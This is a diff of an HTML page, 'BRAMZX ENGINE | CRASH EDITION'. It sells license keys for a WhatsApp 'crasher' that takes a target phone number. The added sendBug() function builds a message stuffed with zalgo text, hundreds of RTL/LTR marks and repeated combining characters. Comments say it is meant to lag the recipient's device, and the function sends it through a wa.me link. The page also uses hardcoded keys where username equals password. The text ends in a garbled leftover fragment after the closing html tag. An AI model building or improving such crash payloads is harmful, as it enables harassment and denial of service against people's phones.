@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BRAMZX ENGINE | OFFICIAL VVIP</title>
+    <title>BRAMZX ENGINE | CRASH EDITION</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --red: #ff0000; --purple: #a020f0; --bg: #050505; --card: #121212; }
@@ -14,15 +14,13 @@
         .sound-btn { position: fixed; top: 15px; right: 15px; z-index: 1000; background: rgba(255,255,255,0.1); border: 1px solid #444; color: #fff; width: 35px; height: 35px; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
 
         /* VIDEO BANNER STYLE */
-        .video-banner { width: 100%; border-radius: 15px; border: 1px solid #333; object-fit: cover; margin-bottom: 20px; box-shadow: 0 0 15px rgba(255,255,255,0.05); }
+        .video-banner { width: 100%; border-radius: 15px; border: 1px solid #333; object-fit: cover; margin-bottom: 20px; box-shadow: 0 0 15px rgba(255,255,255,0.2); }
 
         /* --- UI LOGIN --- */
         #login-page { height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; }
         .login-card { width: 350px; background: #151515; border: 1px solid rgba(255,255,255,0.1); border-radius: 25px; padding: 30px; text-align: center; }
-        input.login-in { width: 100%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #333; color: #fff; border-radius: 12px; box-sizing: border-box; text-align: center; outline: none; transition: 0.3s; }
-        input.login-in:focus { border-color: #fff; }
-        .btn-login { width: 100%; padding: 15px; background: #fff; border: none; color: #000; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        .btn-login:hover { transform: scale(1.02); background: #eee; }
+        input.login-in { width: 100%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #333; color: #fff; border-radius: 12px; box-sizing: border-box; text-align: center; outline: none; }
+        .btn-login { width: 100%; padding: 15px; background: #fff; border: none; color: #000; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; }
 
         /* --- UI DASHBOARD --- */
         #dashboard { padding: 20px; animation: fadeIn 0.5s; height: 100vh; overflow-y: auto; box-sizing: border-box; }
@@ -31,19 +29,17 @@
         
         .slider-container { width: 100%; overflow: hidden; border-radius: 15px; margin-bottom: 20px; border: 1px solid #222; position: relative; }
         .slider { display: flex; transition: transform 0.5s ease-in-out; }
-        .slider img { width: 100%; flex-shrink: 0; object-fit: cover; }
+        .slider img { width: 100%; flex-shrink: 0; }
 
         .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .menu-box { background: #151515; border-radius: 15px; padding: 25px 15px; text-align: center; border: 1px solid #222; cursor: pointer; transition: 0.3s; }
-        .menu-box:hover { border-color: var(--red); background: #1a1a1a; }
+        .menu-box { background: #151515; border-radius: 15px; padding: 25px 15px; text-align: center; border: 1px solid #222; cursor: pointer; }
         .menu-box i { font-size: 24px; color: var(--red); margin-bottom: 10px; display: block; }
-        .menu-box span { font-size: 13px; font-weight: bold; }
         .badge { background: #300; color: var(--red); padding: 2px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; border: 1px solid var(--red); }
 
         /* --- UI CRASHER --- */
-        #crasher-page { padding: 20px; animation: fadeIn 0.5s; min-height: 100vh; box-sizing: border-box; }
+        #crasher-page { padding: 20px; animation: fadeIn 0.5s; }
         .crasher-card { background: linear-gradient(145deg, #1a0033, #0a0a0a); border: 1px solid var(--purple); border-radius: 20px; padding: 20px; }
-        .btn-send { width: 100%; padding: 15px; background: linear-gradient(to right, #4b0082, #a020f0); border: none; border-radius: 10px; color: #fff; font-weight: bold; margin-top: 20px; cursor: pointer; box-shadow: 0 5px 15px rgba(160,32,240,0.3); }
+        .btn-send { width: 100%; padding: 15px; background: linear-gradient(to right, #4b0082, #a020f0); border: none; border-radius: 10px; color: #fff; font-weight: bold; margin-top: 20px; cursor: pointer; }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
@@ -59,12 +55,12 @@
         <video id="vid-login" class="video-banner" loop muted playsinline autoplay>
             <source src="https://RYxinz.github.io/video-bug/loading.mp4" type="video/mp4">
         </video>
-        <h2 style="margin:0; letter-spacing: 2px;">BRAMZX ENGINE</h2>
-        <p style="font-size: 9px; color: #555; margin-bottom: 20px; letter-spacing: 1px;">TEKNOLOGI DARI SISTEM API</p>
+        <h2 style="margin:0;">BRAMZX ENGINE</h2>
+        <p style="font-size: 9px; color: #555; margin-bottom: 20px;">SYSTEM OVERLOAD ACTIVATED</p>
         <input type="text" id="u-key" class="login-in" placeholder="Username">
         <input type="password" id="p-key" class="login-in" placeholder="Password">
         <button class="btn-login" onclick="doLogin()">LOGIN SYSTEM</button>
-        <button onclick="buy()" style="background:none; border:none; color:#444; font-size:11px; margin-top:15px; cursor:pointer;">Created Akun</button>
+        <button onclick="buy()" style="background:none; border:none; color:#444; font-size:11px; margin-top:15px; cursor:pointer;">Request Access</button>
     </div>
 </div>
 
@@ -72,7 +68,7 @@
     <div class="profile-header">
         <img src="https://RYxinz.github.io/Jpg/pmdg4.jpg" class="avatar">
         <div>
-            <h3 id="u-name" style="margin:0; letter-spacing: 1px;">BRAMZX OWNER</h3>
+            <h3 id="u-name" style="margin:0;">BRAMZX OWNER</h3>
             <span class="badge" id="u-exp">EXP: 2099-09-09</span>
             <span id="u-role-badge" class="badge" style="background:var(--red); color:#000;">OWNER</span>
         </div>
@@ -95,36 +91,30 @@
         <div class="menu-box" onclick="window.open('https://t.me/BramzProject', '_blank')">
             <i class="fab fa-telegram-plane" style="color:#0088cc;"></i><span>Telegram</span>
         </div>
-        <div class="menu-box" onclick="alert('AI Mode Active!')">
+        <div class="menu-box" onclick="alert('Engine Stabilized')">
             <i class="fas fa-robot"></i><span>Chat AI</span>
         </div>
     </div>
-    
-    <button onclick="location.reload()" style="width:100%; background:#111; color:#ff4444; border:1px solid #222; padding:15px; border-radius:15px; margin-top:20px; font-weight:bold; cursor:pointer;">LOGOUT SYSTEM</button>
+    <button onclick="location.reload()" style="width:100%; background:#111; color:#ff4444; border:1px solid #222; padding:15px; border-radius:15px; margin-top:20px; font-weight:bold; cursor:pointer;">LOGOUT</button>
 </div>
 
 <div id="crasher-page" class="hidden">
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
         <button onclick="backToDash()" style="background:none; border:none; color:#fff; font-size:20px; cursor:pointer;"><i class="fas fa-arrow-left"></i></button>
-        <h3 style="color:var(--purple); letter-spacing: 1px;">DRAGON FURY</h3>
+        <h3 style="color:var(--purple);">GLITCH OVERLOAD</h3>
         <div style="width:20px;"></div>
     </div>
-
     <div class="crasher-card">
         <video id="vid-crasher" class="video-banner" loop muted playsinline>
             <source src="https://RYxinz.github.io/Bug/video.mp4" type="video/mp4">
         </video>
-        <label style="font-size:11px; color:var(--purple); margin-left:5px;">NUMBER TARGET</label>
-        <input type="text" id="target" style="width:100%; background:rgba(0,0,0,0.5); border:1px solid var(--purple); padding:15px; border-radius:10px; color:#fff; box-sizing:border-box; margin-top:5px; outline:none;" placeholder="6289xxxx">
-        
-        <label style="font-size:11px; color:var(--purple); margin-left:5px; display:block; margin-top:15px;">PAYLOAD TYPE</label>
-        <select id="type" style="width:100%; padding:15px; background:#000; border:1px solid var(--purple); color:#fff; border-radius:10px; margin-top:5px; outline:none;">
-            <option value="DELAY ATTACK">VIRTEX DELAY</option>
-            <option value="FREEZE SYSTEM">VIRTEX FREEZE</option>
-            <option value="ULTRAS KILAT">VIRTEX ULTRAS</option>
+        <input type="text" id="target" style="width:100%; background:rgba(0,0,0,0.5); border:1px solid var(--purple); padding:15px; border-radius:10px; color:#fff; box-sizing:border-box;" placeholder="6289xxxx">
+        <select id="type" style="width:100%; padding:15px; background:#111; border:1px solid var(--purple); color:#fff; border-radius:10px; margin-top:10px;">
+            <option>HEAVY GLITCH V1</option>
+            <option>SYSTEM FREEZE V2</option>
+            <option>RAM DESTROYER V3</option>
         </select>
-        
-        <button class="btn-send" onclick="sendBug()">SEND BUG ATTACK</button>
+        <button class="btn-send" onclick="sendBug()">EXECUTE ATTACK</button>
     </div>
 </div>
 
@@ -133,47 +123,78 @@
     const vCrasher = document.getElementById('vid-crasher');
     const volIcon = document.getElementById('vol-icon');
 
-    // MUTE/UNMUTE LOGIC
     function toggleMute() {
-        if (vLogin.muted) {
-            vLogin.muted = false; vCrasher.muted = false;
-            volIcon.className = "fas fa-volume-up";
-        } else {
-            vLogin.muted = true; vCrasher.muted = true;
-            volIcon.className = "fas fa-volume-mute";
-        }
+        if (vLogin.muted) { vLogin.muted = false; vCrasher.muted = false; volIcon.className = "fas fa-volume-up"; } 
+        else { vLogin.muted = true; vCrasher.muted = true; volIcon.className = "fas fa-volume-mute"; }
     }
 
-    // DATABASE: 1 OWNER + 80 VIP
+    // DB 80 USER
     const DB = { "BRAMZX-OWNER-999": { role: "OWNER", name: "BRAMZX SUPREME", exp: "2099-09-09" } };
     for (let i = 1; i <= 80; i++) {
-        let key = "BRAMZX-VIP-" + (i < 10 ? '0' + i : i);
-        DB[key] = { role: "VIP", name: "USER VIP #" + (i < 10 ? '0' + i : i), exp: "2029-09-09" };
+        let k = "BRAMZX-VIP-" + (i < 10 ? '0' + i : i);
+        DB[k] = { role: "VIP", name: "USER VIP #" + i, exp: "2029-09-09" };
     }
 
-    // LOGIN LOGIC
     function doLogin() {
         const u = document.getElementById('u-key').value.trim();
         const p = document.getElementById('p-key').value.trim();
-        
         if (DB[u] && u === p) {
-            // STOP LOGIN SOUND & VIDEO
-            vLogin.pause();
-            vLogin.currentTime = 0;
-            vLogin.muted = true;
-
+            vLogin.pause(); vLogin.currentTime = 0;
             document.getElementById('login-page').classList.add('hidden');
             document.getElementById('dashboard').classList.remove('hidden');
             document.getElementById('u-name').innerText = DB[u].name;
-            document.getElementById('u-exp').innerText = "EXP: " + DB[u].exp;
-            
-            const badge = document.getElementById('u-role-badge');
-            badge.innerText = DB[u].role;
-            if(DB[u].role === "VIP") badge.style.cssText = "background:#fff; color:#000;";
-
             document.querySelector('.sound-btn').classList.add('hidden');
-        } else {
-            alert("LICENSE KEY SALAH ATAU SUDAH EXPIRED!");
+        } else { alert("KEY INVALID!"); }
+    }
+
+    function goToCrasher() {
+        document.querySelector('.sound-btn').classList.remove('hidden');
+        vCrasher.play();
+        document.getElementById('dashboard').classList.add('hidden');
+        document.getElementById('crasher-page').classList.remove('hidden');
+    }
+
+    function backToDash() {
+        vCrasher.pause();
+        document.querySelector('.sound-btn').classList.add('hidden');
+        document.getElementById('crasher-page').classList.add('hidden');
+        document.getElementById('dashboard').classList.remove('hidden');
+    }
+
+    // --- HEAVY LAG PAYLOAD ---
+    function sendBug() {
+        const target = document.getElementById('target').value.replace(/[^0-9]/g, '');
+        const type = document.getElementById('type').value;
+        if (!target) return alert("INPUT TARGET!");
+
+        // Unicode kombinasi yang bikin ngerender grafis jadi lag parah
+        const glitchText = "B̴R̴A̴M̴Z̴X̴-̴E̴N̴G̴I̴N̴E̴";
+        const invisibleStrike = "‎‏".repeat(500); // RTL-LTR Mark Overload
+        const heavyUnicode = "ॣ ॣ ॣ".repeat(300); // Thai Character bug
+        
+        const payload = `*ATTACK INITIATED* %0A%0A` + 
+                        `${glitchText}%0A` + 
+                        `${invisibleStrike}%0A` + 
+                        `${heavyUnicode}%0A%0A` + 
+                        `*MODE:* ${type}%0A` + 
+                        `*RESULT:* SYSTEM_LAG_DETECTED`;
+
+        window.open(`https://wa.me/${target}?text=${payload}`, '_blank');
+    }
+
+    let currentSlide = 0;
+    function moveSlider() {
+        currentSlide = currentSlide === 0 ? 1 : 0;
+        const s = document.getElementById('main-slider');
+        if(s) s.style.transform = `translateX(-${currentSlide * 100}%)`;
+    }
+    setInterval(moveSlider, 4000);
+
+    function buy() { window.open('https://wa.me/628983716868?text=Beli%20Key%20Bramzx', '_blank'); }
+</script>
+</body>
+</html>
+H EXPIRED!");
         }
     }
 
